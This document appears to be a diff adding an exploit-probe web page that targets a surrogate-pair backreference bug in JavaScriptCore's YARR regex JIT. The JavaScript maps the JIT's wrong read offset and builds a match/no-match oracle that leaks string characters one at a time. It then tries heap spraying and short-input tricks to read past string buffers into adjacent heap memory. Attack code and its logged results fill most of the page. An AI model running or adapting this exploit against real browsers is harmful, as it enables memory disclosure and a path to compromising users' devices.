+  // /u mode handles lone surrogates as individual code points in some implementations.
+  // Interp: capture = U+10000. Subject code point = DC00 (or error). U+10000 != DC00 -> fail.
+  // JIT with offset=1: reads [UChar[1], UChar[2]] = [DC00, DC00].
+  //   Compares with subject [UChar[2], UChar[3]] = [DC00, DC00]. -> match!
+  // JIT with offset=3: reads [UChar[3], UChar[4]] = [DC00, 0063].
+  //   Compares with subject [UChar[2], UChar[3]] = [DC00, DC00]. DC00==DC00 ok, 0063!=DC00 fail.
+
+  // So for input [D800, DC00, DC00, DC00, 0063]:
+  //   offset=1: JIT matches, offset=3: JIT fails
+  var freshE1 = /(.)\1c/u;
+  var iE1 = String.fromCharCode(0xD800, 0xDC00, 0xDC00, 0xDC00, 0x0063);
+  var e1i = freshE1.exec(iE1);
+  warmJIT(freshE1, "\u{10000}\u{10000}c", 600);
+  var e1j = freshE1.exec(iE1);
+  emit('E-OFF1', 'interp=' + (e1i ? 'M' : 'N') + ',jit=' + (e1j ? 'M' : 'N'));
+  // If JIT=M -> offset includes 1. If JIT=N -> offset does NOT include 1.
+
+  // Test offset=3: Make UChar[3] match UChar[2] and UChar[4] match UChar[3]
+  // Already tested in D4: input = "\u{10000}ccc" = [D800, DC00, 0063, 0063, 0063]
+  // offset=3: reads [0063, 0063], compares with [0063, 0063] -> match
+  // offset=1: reads [DC00, 0063], compares with [0063, 0063] -> DC00!=0063 -> fail
+  // D4 result tells us if offset=3.
+
+  // Also: Test what the YARR JIT does when /u is absent (non-Unicode mode)
+  // In non-Unicode mode, the surrogate pair path is NOT taken.
+  // The bug should NOT affect non-Unicode regex.
+  var freshE2 = /(.)\1c/; // no /u flag
+  var iE2 = "\u{10000}\u{10000}c"; // still contains surrogate pairs as UChars
+  var e2i = freshE2.exec(iE2);
+  warmJIT(freshE2, iE2, 600);
+  var e2j = freshE2.exec(iE2);
+  emit('E-NOUFLAG', 'interp=' + (e2i ? 'M' : 'N') + ',jit=' + (e2j ? 'M' : 'N'));
+
+  // E3: Test with case-insensitive + unicode (/iu flag)
+  var freshE3 = /(.)\1c/iu;
+  var iE3 = "\u{10000}\u{10000}c";
+  var e3i = freshE3.exec(iE3);
+  warmJIT(freshE3, iE3, 600);
+  var e3j = freshE3.exec(iE3);
+  emit('E-IU', 'interp=' + (e3i ? 'M' : 'N') + ',jit=' + (e3j ? 'M' : 'N'));
+
+} catch(e) {
+  emit('E-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE F: Heap-adjacent read attempt
+// Use the within-string oracle to read data from a concatenated string.
+// If we build a string by concatenating a surrogate pair with unknown data,
+// the wrong-offset read lets us probe the unknown data byte by byte.
+//
+// Strategy:
+// 1. Create a "victim" string: concat surrogate pair + heap-leaked AB data
+// 2. For each possible UChar value at the read position, test if regex matches
+// 3. The matching value reveals the UChar at that position
+// ====================================================================
+emit('PHASE-F', 'start');
+try {
+  // F1: Concatenation-based oracle proof of concept
+  // Build string: \u{10000} + SECRET + \u{10000} + SECRET + trailing
+  // where SECRET = "HELLO" (known, for validation)
+  // Regex: /(.)\\1HELLO<trail>/u
+  // The backreference reads at offset from captured start (position 0)
+  // into the SECRET region.
+  
+  // Actually, simpler: just embed a target value in the string at the
+  // expected read position and see if the match oracle works.
+
+  // If we determined offset=3 from Phase E/D tests:
+  // For /(.)\\1X/u where X is 1 trailing char:
+  //   offset = 3, JIT reads UChar[3]
+  //   Input: [capture pair][subject pair][X]
+  //   UChar[3] = low surrogate of subject pair
+  //   We can't control this independently from the subject pair.
+
+  // For longer trailing: /(.)\\1abcde/u:
+  //   offset = 2 + 5 = 7 (hypothesis: offset = 2 + len(trailing))
+  //   Input: [D800 DC00] [D800 DC00] a b c d e
+  //   JIT reads UChar[7] = 'e' (0x0065)
+  //   Compares with UChar[2] = D800
+  //   0x0065 != D800 -> fail
+  //   Both interp and JIT fail (interp because subject is U+10000 = capture ✓,
+  //   then trailing "abcde" matches -> interp MATCHES)
+  //   Wait: interp matches (capture U+10000, backreference matches second U+10000,
+  //   trailing "abcde" matches). JIT fails due to wrong read. This is the standard bug.
+
+  // But the VALUE read by the JIT (UChar[7] = 'e') is compared against UChar[2] = D800.
+  // We can't observe the read value directly, only match/no-match.
+  // To oracle a value, we'd need to make UChar[2] equal to the target value.
+  // But UChar[2] is always D800 (high surrogate of subject pair)... unless we use
+  // a different code point.
+
+  // If subject is U+10400 = [D801, DC00]:
+  // UChar[2] = D801. JIT reads UChar[7] and compares with D801.
+  // If UChar[7] == D801 -> match. If not -> fail.
+  // By varying the subject code point (D800..DBFF), we probe which
+  // value UChar[7] has. But D800..DBFF is only 1024 values, and the
+  // target is an arbitrary UChar (0..FFFF). This doesn't cover all values.
+
+  // Alternative approach: non-standard input where subject is a BMP char
+  // (as in D4 test). Subject = UChar[2] = some BMP value V.
+  // JIT reads UChar[offset] and compares with V.
+  // We set V = candidate_value. If match -> UChar[offset] == candidate_value.
+
+  // For a concatenated string probe:
+  // secret_char = some unknown UChar value
+  // Build input: [D800, DC00, candidate, ..., secret_char, ..., 0063, ...]
+  // Place secret_char at UChar[offset]. Set candidate = UChar[2] to test if
+  // secret_char == candidate. Sweep candidate from 0x0000 to 0xFFFF.
+
+  // But UChar[2] is the subject position. We need the interpreter to NOT match
+  // (so we don't confuse interp-match with jit-match).
+  // Interp: capture=U+10000, subject=candidate (BMP). U+10000 != candidate -> interp fails.
+  // JIT: reads UChar[offset]=secret_char, compares with UChar[2]=candidate.
+  // If secret_char == candidate -> JIT matches.
+  // So: JIT=MATCH means secret_char == candidate.
+
+  // This IS a byte-at-a-time oracle!
+
+  // Demo: "leak" a known character to validate the oracle.
+  var secretChar = 0x4242; // 'BB' - our known secret
+  // Input structure for /(.)\\1c/u (offset ~3):
+  // [D800, DC00, candidate, secret_char, 0063]
+  //  ^capture    ^subject   ^JIT-reads   ^'c'
+  // UChar[0]=D800, [1]=DC00, [2]=candidate, [3]=secret_char, [4]=0063
+
+  // Sweep candidate values to find which one makes JIT match
+  var foundValue = -1;
+  var sweepResults = [];
+  // Test a targeted range first (around the known secret)
+  var candidates = [0x4240, 0x4241, 0x4242, 0x4243, 0x4244,
+                    0x0041, 0x0063, 0xD800, 0xDC00, 0x0000, 0xFFFF];
+
+  for (var si = 0; si < candidates.length; si++) {
+    var cand = candidates[si];
+    var freshFS = /(.)\1c/u;
+    var iFS = String.fromCharCode(0xD800, 0xDC00, cand, secretChar, 0x0063);
+
+    // Interpreter (should never match: capture is U+10000, subject is BMP cand)
+    var fsi = freshFS.exec(iFS);
+    // JIT
+    warmJIT(freshFS, "\u{10000}\u{10000}c", 600);
+    var fsj = freshFS.exec(iFS);
+
+    var tag = 'F1-' + hex16(cand);
+    if (fsj && !fsi) {
+      emit(tag, 'JIT-MATCH(oracle-hit)');
+      foundValue = cand;
+    } else if (fsi && fsj) {
+      emit(tag, 'BOTH-MATCH');
+    } else {
+      sweepResults.push(hex16(cand) + ':N');
+    }
+  }
+  if (sweepResults.length > 0) {
+    emit('F1-MISS', sweepResults.join(','));
+  }
+  if (foundValue >= 0) {
+    emit('F1-LEAKED', 'value=' + hex16(foundValue) +
+         (foundValue === secretChar ? ' CORRECT!' : ' WRONG(expected=' + hex16(secretChar) + ')'));
+  } else {
+    emit('F1-NOLEAK', 'no-candidate-matched');
+  }
+
+  // F2: If offset is confirmed as 3, try a wider byte sweep for an unknown value
+  // Place an "unknown" at position 3 that varies per test
+  // This is slower but proves the oracle works for arbitrary values
+  var unknownChar = 0xBEEF;
+  var f2found = -1;
+  // Binary search would be faster but linear is simpler for a probe
+  // Test high byte first (narrow down)
+  var highByte = (unknownChar >> 8) & 0xFF;
+  var lowByte = unknownChar & 0xFF;
+  // Test 16 candidate high bytes
+  for (var hb = 0; hb < 256 && f2found < 0; hb += 16) {
+    for (var delta = 0; delta < 16 && f2found < 0; delta++) {
+      var testHigh = hb + delta;
+      // Test full UChar values with this high byte
+      var testVal = (testHigh << 8) | lowByte;
+      var freshF2 = /(.)\1c/u;
+      var iF2 = String.fromCharCode(0xD800, 0xDC00, testVal, unknownChar, 0x0063);
+      var f2j_prev = freshF2.exec(iF2); // interp
+      warmJIT(freshF2, "\u{10000}\u{10000}c", 600);
+      var f2j = freshF2.exec(iF2); // JIT
+      if (f2j && !f2j_prev) {
+        f2found = testVal;
+      }
+    }
+  }
+  emit('F2-WIDE', f2found >= 0 ?
+    'leaked=' + hex16(f2found) + (f2found === unknownChar ? ' CORRECT!' : ' WRONG') :
+    'no-match-found');
+
+} catch(e) {
+  emit('F-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE G: Heap spray + OOB attempt
+// If the oracle works within the string, attempt to leak data from
+// ADJACENT heap allocations. Spray the heap with known patterns,
+// then create a target string whose buffer is followed by spray data.
+// Use the oracle to read past the string buffer.
+//
+// For actual OOB, we need a string whose internal buffer is shorter
+// than the JIT's read offset. This can happen with rope strings,
+// external strings, or strings that share a buffer via substring.
+// ====================================================================
+emit('PHASE-G', 'start');
+try {
+  // G1: Test with rope strings (created by concatenation)
+  // JSC might not flatten a rope string before regex matching, or might
+  // flatten it into a tight buffer. If the buffer is tight, the JIT's
+  // read stays within bounds.
+
+  // Spray heap with marker pattern
+  var spray = [];
+  for (var gi = 0; gi < 5000; gi++) {
+    spray.push(String.fromCharCode(0xCAFE, 0xBABE, 0xDEAD, 0xBEEF,
+                                    0xCAFE, 0xBABE, 0xDEAD, 0xBEEF));
+  }
+
+  // Create target strings of specific sizes to align with allocation boundaries
+  // bmalloc size classes: 16, 32, 48, 64, 80, 96, 112, 128, ...
+  // StringImpl overhead: ~24 bytes on 64-bit (refCount, length, hash, flags)
+  // A 4-UChar string = 8 bytes + 24 = 32 bytes (fits in 32-byte class)
+  // A 12-UChar string = 24 bytes + 24 = 48 bytes (fits in 48-byte class)
+
+  // If we create a short string and the JIT reads past its buffer,
+  // it reads from the next allocation (our spray).
+
+  // For /(.)\\1c/u, input needs minimum 5 UChars (3 code points in /u).
+  // 5 UChars = 10 bytes + 24 overhead = 34 bytes -> 48-byte class.
+  // The buffer has 48 - 24 = 24 bytes, but only 10 are string data.
+  // Bytes 10..23 are padding within the allocation.
+  // The NEXT allocation starts at byte 48.
+  // JIT reads at UChar[offset] = byte 2*offset from buffer start.
+  // offset=3: byte 6. Still within 10 bytes of string data.
+  // offset=7: byte 14. Past string data, but within the 24-byte data area.
+  //   These are PADDING bytes, might be zero or might contain old data.
+  // offset=12: byte 24. This is the StringImpl header of the NEXT allocation!
+  //   If the next allocation is our spray string, byte 24+ contains spray data.
+
+  // To reach offset=12, we need /(.)\\1XXXXXXXXXX/u (10 trailing chars)
+  // offset = 2 + 10 = 12
+  // Input: \u{10000}\u{10000}XXXXXXXXXX (4 + 10 = 14 UChars = 28 bytes)
+  // 28 + 24 = 52 bytes -> 64-byte class
+  // The extra allocation space: 64-24 = 40 bytes, string uses 28.
+  // Bytes 28..39 are padding. Offset 12 = byte 24, within string data.
+  // Still within bounds!
+
+  // The fundamental issue: the string always contains enough data because
+  // it must match the trailing chars. The read offset never exceeds the
+  // string length for standard matching.
+
+  // HOWEVER: if we use a string that was MODIFIED after creation
+  // (e.g., via a substring view where the original buffer was freed),
+  // the buffer might be shorter. This is unlikely with immutable JS strings.
+
+  // G2: Test if the JIT reads past the logical string length
+  // by examining the match result when we truncate the input.
+  // Use a substring of a larger string as input.
+  var longStr = "\u{10000}\u{10000}cdefghijklmnopqrstuvwxyz";
+  var shortView = longStr.substring(0, 5); // Just "\u{10000}\u{10000}c" (5 UChars)
+  // If JSC uses the parent buffer, offset=7 reads UChar[7]='f' (within parent buffer)
+  // If JSC copies to a new buffer, offset=7 reads padding/heap data
+
+  var freshG2 = /(.)\1c/u;
+  var g2i = freshG2.exec(shortView);
+  warmJIT(freshG2, "\u{10000}\u{10000}c", 600);
+  var g2j = freshG2.exec(shortView);
+  emit('G2-SUBSTR', 'i=' + (g2i ? 'M' : 'N') + ',j=' + (g2j ? 'M' : 'N') +
+       ',viewLen=' + shortView.length);
+
+  // G3: Test with a string created from ArrayBuffer via TextDecoder
+  // This might create a string with a tight buffer
+  try {
+    var td = new TextDecoder('utf-16le');
+    var ab = new ArrayBuffer(10); // 5 UChars
+    var dv = new DataView(ab);
+    dv.setUint16(0, 0xD800, true); // little-endian
+    dv.setUint16(2, 0xDC00, true);
+    dv.setUint16(4, 0xD800, true);
+    dv.setUint16(6, 0xDC00, true);
+    dv.setUint16(8, 0x0063, true); // 'c'
+    var tightStr = td.decode(ab);
+    emit('G3-TD', 'decoded=' + tightStr.length + ' uchars');
+
+    var freshG3 = /(.)\1c/u;
+    var g3i = freshG3.exec(tightStr);
+    warmJIT(freshG3, "\u{10000}\u{10000}c", 600);
+    var g3j = freshG3.exec(tightStr);
+    emit('G3-RESULT', 'i=' + (g3i ? 'M' : 'N') + ',j=' + (g3j ? 'M' : 'N'));
+  } catch(tdErr) {
+    emit('G3-ERR', tdErr.message);
+  }
+
+  // G4: Aggressive test — create very short string and use long-offset pattern
+  // If the JIT doesn't bounds-check the pattern read and the buffer is tight,
+  // reading at a large offset hits adjacent heap memory.
+  // We warm the JIT with a LONG input but test with a SHORT input.
+  var longInput = "\u{10000}\u{10000}abcdefghijklmnop"; // 20 UChars
+  var shortInput = "\u{10000}\u{10000}abcdefghijklmnop".substring(0, 5);
+  // shortInput = "\u{10000}\u{10000}a" = 5 UChars
+  // But the regex expects 'abcdefghijklmnop' after the backreference
+  // So the regex won't match shortInput — the trailing chars don't fit.
+  // The JIT might still perform the backreference read before checking length.
+
+  var freshG4 = /(.)\1abcdefghijklmnop/u;
+  warmJIT(freshG4, longInput, 600);
+  // The regex was JIT compiled for the pattern. Now test with short input.
+  // If the JIT generates code that reads at offset 18 from position 0,
+  // and the short input only has 5 UChars (10 bytes), the read at byte 36
+  // goes past the buffer. This could crash or read heap data.
+  try {
+    var g4j = freshG4.exec(shortInput);
+    emit('G4-SHORT', 'result=' + (g4j ? 'M' : 'N') + ',no-crash');
+  } catch(g4err) {
+    emit('G4-SHORT', 'exception=' + g4err.message);
+  }
+
+  // G5: Same but with spray adjacent to the short string
+  // Allocate short strings right before testing
+  var shortStrings = [];
+  for (var si2 = 0; si2 < 1000; si2++) {
+    shortStrings.push(String.fromCharCode(0xD800, 0xDC00, 0xD800, 0xDC00, 0x0063));
+  }
+  // Force GC to consolidate
+  for (var gi2 = 0; gi2 < 10; gi2++) {
+    var garbage = new Array(10000);
+    for (var j = 0; j < garbage.length; j++) garbage[j] = { x: j };
+    garbage = null;
+  }
+
+  var freshG5 = /(.)\1abcdefghij/u;
+  warmJIT(freshG5, "\u{10000}\u{10000}abcdefghij", 600);
+  for (var sg = 0; sg < shortStrings.length; sg++) {
+    try {
+      var g5r = freshG5.exec(shortStrings[sg]);
+      // shortStrings[sg] is only 5 UChars, pattern expects 14 code points
+      // JIT might read at offset ~12 from position 0 -> UChar[12] is past the 5 UChar buffer
+      if (g5r) {
+        emit('G5-HIT', 'idx=' + sg + ' UNEXPECTED-MATCH');
+        break;
+      }
+    } catch(g5err) {
+      emit('G5-CRASH', 'idx=' + sg + ' ' + g5err.message);
+      break;
+    }
+  }
+  emit('G5-DONE', 'tested=' + shortStrings.length);
+
+} catch(e) {
+  emit('G-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE H: Summary and diagnostics
+// ====================================================================
+emit('PHASE-H', 'summary');
+try {
+  // H1: Confirm YARR JIT is active
+  // Run a complex regex many times and measure performance
+  var t0 = Date.now();
+  var complexRe = /(?:(\w+)\s+){3,}/;
+  var complexInput = "the quick brown fox jumps over the lazy dog again and again";
+  for (var hi = 0; hi < 10000; hi++) complexRe.exec(complexInput);
+  var dt = Date.now() - t0;
+  emit('H1-PERF', dt + 'ms-for-10k-execs');
+
+  // H2: Test /u flag availability
+  try {
+    var uTest = new RegExp('.', 'u');
+    emit('H2-UFLAG', 'supported');
+  } catch(ue) {
+    emit('H2-UFLAG', 'NOT-SUPPORTED:' + ue.message);
+  }
+
+  // H3: Supplementary character support
+  var suppTest = "\u{10000}";
+  emit('H3-SUPP', 'len=' + suppTest.length + ',cp=' + suppTest.codePointAt(0).toString(16));
+
+  // H4: Report string internal representation hints
+  // JSC uses 8-bit (Latin1) for ASCII-only strings, 16-bit for others
+  var asciiStr = "hello";
+  var uniStr = "\u{10000}hello";
+  emit('H4-STR', 'ascii=' + asciiStr.length + ',uni=' + uniStr.length);
+
+} catch(e) {
+  emit('H-ERR', e.message);
+}
+
+emit('DONE', 'p659-complete');
+flush();
+
+})();
+</script>
+</body></html>
